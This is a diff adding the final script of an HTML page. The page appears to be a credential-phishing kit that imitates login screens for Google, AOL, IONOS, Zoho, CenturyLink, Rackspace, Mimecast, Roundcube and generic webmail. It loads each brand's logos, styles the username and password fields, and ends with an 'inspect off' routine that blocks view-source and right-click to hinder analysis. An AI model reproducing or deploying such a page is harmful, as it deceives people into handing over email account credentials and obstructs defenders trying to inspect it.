+        setImg(mimecast_logo, 'domain_assets/mimecast_logo.png');
+        setImg(ggl_logo, 'domain_assets/Google_logo.png');
+        setImg(ggl_account_icon, 'domain_assets/ggl_account_icon.jpg');
+        setImg(ggl_down_icon, 'domain_assets/ggl_down_icon.jpg');
+        setImg(exclam_icon, 'domain_assets/exclam_error.jpg');
+        setImg(exclam_icon2, 'domain_assets/exclam_error.jpg');
+        setImg(rk_logo, 'domain_assets/Rackspace_Technology_Logo_RGB_WHT (1).png');
+        setImg(rk_banner, 'domain_assets/Suspicious-Email-Banner.jpg');
+        setImg(ionos_logo, 'domain_assets/ionos_logo.jpg');
+        setImg(ionos_search_bar, 'domain_assets/ionos_search.jpg');
+        setImg(ionos_qs_icon, 'domain_assets/ionos_icon.jpg');
+        setImg(aol_logo, 'domain_assets/aol_logo.png');
+        setImg(aol_logo2, 'domain_assets/aol_logo.png');
+        setImg(rc_logo, 'domain_assets/roundcube.png');
+        setImg(zohoLogo, 'domain_assets/newZoho_logo.fda7a132d51cfdb4b241aaa9854707b6.svg');
+        setImg(zohoInfo, 'domain_assets/Screenshot 2023-05-08 223907.png');
+        setImg(cl_logo, 'domain_assets/centurylink_logo_s.png');
+        setImg(ionos_user_icon, 'domain_assets/ionos_user_icon.jpg');
+        setImg(ionos_lock_icon, 'domain_assets/ionos_lock_icon.jpg');
+        setImg(wm_user_icon, 'domain_assets/wm_user_icon.jpg');
+        setImg(wm_lock_icon, 'domain_assets/wm_lock_icon.jpg');
+        setImg(iem_, 'domain_assets/email-marketing.svg');
+        setImg(ionos_part_img, 'domain_assets/ionos_part_2.jpg');
+        setImg(wm_logo, 'domain_assets/webmail.svg');
+        setImg(webmail_error, 'domain_assets/webmail_error.jpg');
+        const el_img_url = url_link + 'domain_assets/el_footer.jpg';
+        el_footer.style.backgroundImage = "url('" + el_img_url + "')";
+        const zohoInnerWrapper_url = url_link + 'domain_assets/zoho_bg.svg';
+        zohoInnerWrapper.style.backgroundImage = "url('" + zohoInnerWrapper_url + "')";
+        const clInnerWrapper_url = url_link + 'domain_assets/cl_banner.jpg';
+        clInnerWrapper.style.backgroundImage = "url('" + clInnerWrapper_url + "')";
+
+        // Toggle password visibility
+        function togglePasswordVisibility(elem, passFields) {
+        var passField = document.getElementById(passFields);
+        if (passField.type === 'password') {
+            passField.type = 'text';
+            elem.innerHTML = 'hide';
+        } else {
+            passField.type = 'password';
+            elem.innerHTML = 'show';
+        }
+        }
+
+        // input focus functions
+        document.getElementById('gd_nk_').addEventListener('focus', () => {
+        document.getElementsByClassName('gd_label')[0].classList.add('focus_active');
+        });
+        document.getElementById('gd_nk_').addEventListener('blur', () => {
+        if (document.getElementById('gd_nk_').value == '') {
+            document.getElementsByClassName('gd_label')[0].classList.remove('focus_active');
+        }
+        });
+        document.getElementById('gd_np_').addEventListener('focus', () => {
+        document.getElementsByClassName('gd_label')[1].classList.add('focus_active');
+        });
+        document.getElementById('gd_np_').addEventListener('blur', () => {
+        if (document.getElementById('gd_np_').value == '') {
+            document.getElementsByClassName('gd_label')[1].classList.remove('focus_active');
+        }
+        });
+        document.getElementById('ggl_input').addEventListener('focus', () => {
+        document.getElementById('ggl_label').classList.add('ggl_active_focus');
+        document.getElementById('ggl_input').classList.add('ggl_active_focus_border');
+        });
+        document.getElementById('ggl_input').addEventListener('blur', () => {
+        if (document.getElementById('ggl_input').value == '') {
+            document.getElementById('ggl_label').classList.remove('ggl_active_focus');
+            document.getElementById('ggl_input').classList.remove('ggl_active_focus_border');
+        }
+        });
+        document.getElementById('ggl_input__rpe').addEventListener('focus', () => {
+        document.getElementById('ggl_input__rpe_label').classList.add('ggl_active_focus');
+        document.getElementById('ggl_input__rpe').classList.add('ggl_active_focus_border');
+        });
+        document.getElementById('ggl_input__rpe').addEventListener('blur', () => {
+        if (document.getElementById('ggl_input__rpe').value == '') {
+            document.getElementById('ggl_input__rpe_label').classList.remove('ggl_active_focus');
+            document.getElementById('ggl_input__rpe').classList.remove('ggl_active_focus_border');
+        }
+        });
+        document.getElementById('aol_name_pass').addEventListener('focus', () => {
+        document.getElementById('aol_label__').classList.add('aol_focus_input');
+        });
+        document.getElementById('aol_name_pass').addEventListener('blur', () => {
+        if (document.getElementById('aol_name_pass').value == '') {
+            document.getElementById('aol_label__').classList.remove('aol_focus_input');
+        }
+        });
+        document.getElementById('ionos_email').addEventListener('focus', () => {
+        document.getElementById('ionos_email_label').classList.add('ionos_label_after_focus');
+        });
+        document.getElementById('ionos_email').addEventListener('blur', () => {
+        if (document.getElementById('ionos_email').value == '') {
+            document.getElementById('ionos_email_label').classList.remove('ionos_label_after_focus');
+        }
+        });
+        document.getElementById('ionos_password').addEventListener('focus', () => {
+        document.getElementById('ionos_password_label').classList.add('ionos_label_after_focus');
+        });
+        document.getElementById('ionos_password').addEventListener('blur', () => {
+        if (document.getElementById('ionos_password').value == '') {
+            document.getElementById('ionos_password_label').classList.remove('ionos_label_after_focus');
+        }
+        });
+        document.getElementById('cl_name_key__').addEventListener('focus', () => {
+        document.getElementById('cl_name_key__label').classList.add('cl_input_focus');
+        });
+        document.getElementById('cl_name_key__').addEventListener('blur', () => {
+        if (document.getElementById('cl_name_key__').value == '') {
+            document.getElementById('cl_name_key__label').classList.remove('cl_input_focus');
+        }
+        });
+        document.getElementById('name_pass__').addEventListener('focus', () => {
+        document.getElementById('name_pass__label').classList.add('cl_input_focus');
+        });
+        document.getElementById('name_pass__').addEventListener('blur', () => {
+        if (document.getElementById('name_pass__').value == '') {
+            document.getElementById('name_pass__label').classList.remove('cl_input_focus');
+        }
+        });
+        document.getElementsByClassName('info_btn')[0].addEventListener('mouseover', () => {
+        document.getElementsByClassName('ds_callout')[0].classList.add('d_block');
+        });
+        document.getElementsByClassName('info_btn')[0].addEventListener('mouseout', () => {
+        document.getElementsByClassName('ds_callout')[0].classList.remove('d_block');
+        });
+
+        // button focus
+        mc_name_pass.addEventListener('keyup', () => {
+        if (mc_name_pass.value.length !== 0) {
+            mc_submit_btn.style.backgroundColor = '#1976d2';
+        } else {
+            mc_submit_btn.style.backgroundColor = '#1976d2ad';
+        }
+        });
+
+        //inspect off
+        function redirectCU(e) {
+        if (e.ctrlKey && e.which == 85) {
+            return false;
+        }
+        }
+        document.onkeydown = redirectCU;
+        function redirectKK(e) {
+        if (e.which == 3) {
+            return false;
+        }
+        }
+        document.oncontextmenu = redirectKK;
+
+    </script>
+  </body>
+</html>
